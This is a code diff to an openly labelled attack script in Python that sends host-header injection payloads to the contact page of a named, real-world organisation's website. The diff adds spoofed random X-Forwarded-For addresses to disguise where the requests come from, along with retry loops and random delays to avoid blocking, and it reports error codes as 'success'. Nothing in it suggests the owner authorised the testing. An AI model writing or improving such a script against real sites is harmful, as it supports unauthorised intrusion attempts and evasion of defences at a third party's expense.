@@ -1,4 +1,6 @@
 import requests
+import time
+import random
 
 # Target the contactus section of the website
 footer_url = "https://www.mentorsacco.co.ke/contactus"  # Updated target URL
@@ -13,12 +15,19 @@ payloads = [
     {"Host": "malicious-site.com"}             # Changing the Host header to simulate a malicious server
 ]
 
+# Generate random fake IP addresses (for simulating different machines)
+def generate_random_ip():
+    return '.'.join(str(random.randint(1, 255)) for _ in range(4))
+
 # Function to send requests with payloads to the contactus URL
 def send_payload(footer_url, payload):
     headers = payload
+    # Add random IP address to simulate different sources
+    headers["X-Forwarded-For"] = generate_random_ip()  # Randomizing the IP address
+
     try:
         # Send request with injected headers
-        response = requests.get(footer_url, headers=headers)
+        response = requests.get(footer_url, headers=headers, timeout=10)  # Increased timeout
         return response
     except requests.exceptions.RequestException as e:
         return f"Error: {str(e)}"
@@ -36,20 +45,28 @@ def run_attack():
     print("[+] Starting attack on contactus section...")
 
     for payload in payloads:
-        response = send_payload(footer_url, payload)
+        print(f"[+] Sending payload: {payload}")
         
-        # Check response status and log success/failure
-        if isinstance(response, str):
-            print(f"[!] Error: {response}")
-        else:
-            if response.status_code == 403:
-                print(f"[+] Success: Footer injection resulted in 403 Forbidden.")
-            elif response.status_code == 404:
-                print(f"[+] Success: Footer injection resulted in 404 Not Found.")
+        # Retry mechanism with delays between requests
+        retries = 3
+        for attempt in range(retries):
+            response = send_payload(footer_url, payload)
+            if isinstance(response, str):
+                print(f"[!] Error: {response}")
+                time.sleep(random.uniform(1, 3))  # Random delay between retries
+                continue
             else:
-                print(f"[-] No major change: Response Code {response.status_code}")
+                if response.status_code == 403:
+                    print(f"[+] Success: Footer injection resulted in 403 Forbidden.")
+                elif response.status_code == 404:
+                    print(f"[+] Success: Footer injection resulted in 404 Not Found.")
+                else:
+                    print(f"[-] No major change: Response Code {response.status_code}")
 
-            log_results(payload, response)
+                log_results(payload, response)
+                break
+        else:
+            print(f"[!] Max retries reached for payload: {payload}")
 
     print("[+] Attack completed. Check the log file for detailed results.")
 
